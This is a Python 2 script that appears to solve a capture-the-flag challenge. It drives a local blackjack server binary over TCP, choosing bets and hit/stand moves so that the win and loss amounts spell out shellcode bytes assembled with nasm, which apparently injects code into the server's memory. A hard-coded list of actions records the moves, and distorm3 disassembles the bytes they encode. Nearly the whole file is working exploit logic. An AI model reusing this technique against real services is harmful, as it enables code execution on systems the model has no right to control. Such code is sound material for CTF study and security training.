#!/usr/bin/python

import subprocess as sp
import socket
import re
import time
import sys
import binascii
import traceback
import distorm3 as ds3


def getShellcode():
    sp.check_call('nasm ./shellcode.s', shell=True)
    with open('shellcode', 'rb') as f:
        return f.read(1111)


class ResponseType:
    NONE = -3
    OVER = -2
    UNKNOWN = -1
    ASKNAME = 0
    BET = 1
    MONEY = 2
    DEALER = 3
    PLAYER = 4
    HS = 5
    WIN = 6
    LOOSE = 7
    TIP = 8
    END = 9
    DRAW = 10


class Client:

    def __init__(self):
        self.s = None
        self.msgQueue = []

    def __enter__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect(('192.168.1.77', 6789))
        self.s.settimeout(0.001)
        return self

    def __exit__(self, type, value, traceback):
        self.s.close()

    def readNext(self):
        m = ''
        try:
            while True:
                m += self.s.recv(4096)
        except socket.timeout as e:
            pass
        except socket.error as e:
            print "socket error >> ", e
            sys.exit(1)
        else:
            if len(m) == 0:
                return (ResponseType.OVER, '')
        m = m.rstrip().lstrip()
        if len(m) > 0:
            #print m
            self.msgQueue.extend(m.split('\n'))

    def getNextMsg(self):

        while len(self.msgQueue) == 0:
            self.readNext()

        x = self.msgQueue.pop(0)

        if re.search('Got a name', x):
            return (ResponseType.ASKNAME, x)

        elif re.search('How much would you like', x):
            return (ResponseType.BET, x)

        elif re.search('You have ', x):
            m = re.search('You have \$([0-9]+)', x)
            return (ResponseType.MONEY, x, int(m.group(1)))

        elif re.search('Dealer: ', x):
            return (ResponseType.DEALER, x, 0)
        elif re.search('Player: ', x):
            m = re.search('Player: .* \(([0-9]+)\)', x)
            return (ResponseType.PLAYER, x, int(m.group(1)))
        elif re.search('Hit or Stand', x):
            return (ResponseType.HS, x)

        elif re.search('You lose', x):
            return (ResponseType.LOOSE, x)

        elif re.search('It\'s a draw', x):
            return (ResponseType.DRAW, x)

        elif re.search('You win', x):
            return (ResponseType.WIN, x)

        elif re.search('Would you like to tip', x):
            return (ResponseType.TIP, x)

        elif re.search('Better luck', x):
            return (ResponseType.END, x)

        return (ResponseType.UNKNOWN, x)

    def send(self, m):
        self.s.send(m+'\n')


class Player:

    def __init__(self, c, target, actions):
        self.c = c
        self.target = target
        self.money = 100
        self.curPos = 0
        self.nr = 0
        self.actions = actions

        self.DEFAULT_WIN = 0x50
        self.DEFAULT_LOSS = 0xfd-0x100

    def isDone(self):
        return self.curPos == len(self.target)

    def getNextBet(self):
        want = self.target[self.curPos]
        assert want != 0x80
        if want > 0x80:
            want = -(0x100-want)
        return want

    def doRound(self, strategy, bet):
        self.c.send(str(bet))
        while True:
            score = 0
            win = None
            hs = False
            while True:
                x = self.c.getNextMsg()

                if x[0] == ResponseType.PLAYER:
                    score = x[2]
                elif x[0] == ResponseType.HS:
                    hs = True
                    break
                elif x[0] == ResponseType.WIN:
                    win = True
                    break
                elif x[0] == ResponseType.LOOSE:
                    win = False
                    break
                elif x[0] == ResponseType.DRAW:
                    win = None
                    break

            if not hs:
                if win is None:
                    pass
                elif win:
                    self.money += bet
                else:
                    self.money -= bet

                while True:
                    x = self.c.getNextMsg()
                    assert x[0] != ResponseType.END

                    if x[0] == ResponseType.TIP:
                        self.c.send('N')
                    elif x[0] == ResponseType.MONEY:
                        assert self.money == x[
                            2], "something wrong, got=%d, want=%d" % (self.money, x[2])
                    elif x[0] == ResponseType.BET:
                        return win

            cmd = strategy(score)
            self.c.send(cmd)

    def setup(self):

        x = self.c.getNextMsg()
        assert x[0] == ResponseType.MONEY
        assert x[2] == self.money

        assert self.c.getNextMsg()[0] == ResponseType.BET

        for i, action in enumerate(self.actions):
            self.pos = 0

            def executor(score):
                assert self.pos < len(action[1])
                cmd = action[1][self.pos]
                self.pos += 1
                return cmd

            res = self.doRound(executor, action[0])

            assert self.pos == len(action[1])
            if action[2]:
                self.curPos += 1
            print action[0]
            #assert res == action[3]

            self.nr += 1

    def doPlay(self, bet, wantLoose=False):
        self.play = ''

        def strategy(score):
            cmd = 'S'
            if not wantLoose and score < 18:
                cmd = 'H'
            self.play += cmd
            return cmd
        return (self.doRound(strategy, bet), self.play)

    def solveNext(self):

        nxt = False
        want = 0
        if self.money < 300:
            want = self.DEFAULT_WIN  # push eax, dont care
        else:
            want = self.getNextBet()
            nxt = True

        lastData = False
        if want < 0:
            lastData = self.doPlay(-want, wantLoose=True)
            w = -want

            if lastData[0] or lastData[0] is None:
                nxt = False
                w = self.DEFAULT_WIN
        else:
            lastData = self.doPlay(want, wantLoose=False)
            w = want

            if lastData[0] == False or lastData[0] == None:
                nxt = False
                w = -self.DEFAULT_LOSS
        self.actions.append((w, lastData[1], nxt, lastData[0]))


def doRun(name, actions, shellcode):
    with Client() as c:
        x = c.getNextMsg()
        assert x[0] == ResponseType.ASKNAME
        c.send(name)

        p = Player(c, shellcode, actions)
        p.setup()
        if p.isDone():
            return (True, None)

        print "Money=%d, pos=%d" % (p.money, p.curPos)
        p.solveNext()
        return False


def solve():
    shellcode = getShellcode()
    print map(binascii.hexlify, shellcode)
    shellcode = map(ord, shellcode)
    actions = []
    actions = [
        (3, 'H', False, False), (3, 'H', False, False),
        (3, 'HH', False, False), (3, 'H', False, False),
        (3, 'HHH', False, False), (3, 'HHH', False, False),
        (80, 'S', False, True), (3, 'HH', False, False),
        (3, 'HH', False, False), (3, 'HH', False, False),
        (3, 'HHHH', False, False), (3, 'HH', False, False),
        (3, 'HH', False, False), (3, 'HH', False, False),
        (80, 'S', False, True), (3, 'S', False, False), (80, 'S', False, True),
        (3, 'HHH', False, False), (3, 'HH', False, False),
        (3, 'HHH', False, False), (3, 'S', False, False),
        (3, 'S', False, False), (3, 'H', False, False),
        (3, 'HH', False, False), (80, 'S', False, True),
        (21, 'S', True, False), (3, 'H', False, False), (3, 'S', False, False),
        (4, 'S', True, True), (117, 'S', True, False), (80, 'S', False, True),
        (3, 'HHH', False, False), (3, 'HH', False, False),
        (3, 'HHH', False, False), (80, 'S', False, True),
        (3, 'S', False, False), (4, 'S', True, True), (3, 'HH', False, False),
        (3, 'H', False, False), (3, 'H', False, False), (36, 'S', True, True),
        (61, 'S', True, False), (3, 'HH', False, False),
        (3, 'HHH', False, False), (3, 'HHH', False, False),
        (3, 'HH', False, False), (3, 'HH', False, False),
        (3, 'HHH', False, False), (3, 'H', False, False),
        (3, 'HHHH', False, False), (3, 'HH', False, False),
        (3, 'S', False, False), (3, 'HH', False, False),
        (3, 'S', False, False), (80, 'S', False, True), (3, 'H', False, False),
        (3, 'HH', False, False), (3, 'HH', False, False),
        (49, 'S', True, True), (64, 'S', True, False),
        (3, 'HHH', False, False), (3, 'H', False, False),
        (3, 'H', False, False), (3, 'HHH', False, False),
        (3, 'HH', False, False), (3, 'HHH', False, False)]
    tb = []
    for action in actions:
        sc = 0
        if action[2]:
            sc = action[0]
        else:
            sc = 0x100-action[0]
        tb.append(sc)
    res = ''.join(map(chr, tb))
    for i in ds3.Decode(0, res, ds3.Decode32Bits):
        print i[2]

    print len(actions)

    sys.exit(0)

    name = 'abcd'
    step = 0
    while True:
        step += 1
        print actions
        nx = doRun(name, actions, shellcode)
        if nx:
            print "finished"
            break


if __name__ == '__main__':
    x = None
    try:
        x = sp.Popen('./blackjackServer', shell=True)
        time.sleep(0.2)
        solve()
    except Exception as e:
        print "Got fail"
        traceback.print_exc()
    finally:
        x.kill()
        sp.check_call('killall blackjackServer', shell=True)
